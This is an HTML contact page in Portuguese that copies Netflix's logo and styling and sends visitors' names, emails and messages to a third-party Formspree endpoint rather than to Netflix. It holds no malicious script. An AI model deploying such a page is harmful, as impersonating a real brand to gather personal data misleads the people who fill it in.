<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Netflix</title>
  <link href="https://fonts.googleapis.com/css2?family=Roboto&display=swap" rel="stylesheet">
  <style>
    * {
      margin: 0;
      padding: 0;
      box-sizing: border-box;
    }

    body {
      font-family: 'Roboto', sans-serif;
      background: linear-gradient(to top, #000000, #141414);
      color: white;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      justify-content: flex-start;
      padding: 40px 20px;
    }

    .logo {
      width: 150px;
      margin-bottom: 30px;
    }

    .form-container {
      background-color: rgba(0, 0, 0, 0.75);
      padding: 30px;
      border-radius: 8px;
      width: 100%;
      max-width: 400px;
      box-shadow: 0 0 20px rgba(0,0,0,0.6);
    }

    h1 {
      margin-bottom: 20px;
      color: #fff;
      font-size: 24px;
      text-align: center;
    }

    label {
      display: block;
      margin-top: 15px;
      font-size: 14px;
      color: #b3b3b3;
    }

    input, textarea {
      width: 100%;
      padding: 10px;
      margin-top: 5px;
      border: none;
      border-radius: 4px;
      background-color: #333;
      color: white;
      font-size: 14px;
    }

    button {
      background-color: #e50914;
      color: white;
      border: none;
      padding: 12px;
      margin-top: 20px;
      width: 100%;
      border-radius: 4px;
      font-size: 16px;
      cursor: pointer;
    }

    button:hover {
      background-color: #f40612;
    }
  </style>
</head>
<body>

  <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" alt="Netflix Logo" class="logo">

  <div class="form-container">
    <h1>Fale com a Netflix</h1>
    <form action="https://formspree.io/f/xwplaaqz" method="POST">
      <label for="nome">Nome</label>
      <input type="text" name="nome" id="nome" placeholder="Seu nome" required>

      <label for="email">E-mail</label>
      <input type="email" name="email" id="email" placeholder="Seu e-mail" required>

      <label for="mensagem">Mensagem</label>
      <textarea name="mensagem" id="mensagem" placeholder="Escreva sua mensagem" rows="4" required></textarea>

      <button type="submit">Enviar</button>
    </form>
  </div>

</body>
</html>
